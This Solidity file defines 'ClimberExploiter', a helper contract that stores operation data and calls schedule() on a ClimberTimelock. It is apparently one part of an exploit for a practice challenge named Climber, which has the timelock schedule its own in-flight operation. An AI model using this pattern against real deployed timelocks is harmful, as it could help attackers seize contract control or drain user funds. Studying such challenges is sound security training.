// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IClimberTimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberExploiter is Ownable {

    address climberTimelock;

    bytes32 salt; // zero
    uint256[] values; // zeros
    address[] targets;
    bytes[] dataElements;

    constructor(address _climberTimelock) {
        climberTimelock = _climberTimelock;
    }

    // @dev set values required for schedule(..) function call
    function setValues(
        uint256[] memory _values,
        address[] memory _targets,
        bytes[] memory _dataElements
    ) external onlyOwner {
        values = _values;
        targets = _targets;
        dataElements = _dataElements;
    }

    // @dev sets schedule(..) based on stored variables
    function setSchedule() external {
        IClimberTimelock(climberTimelock).schedule(targets,values,dataElements,salt);
    }
}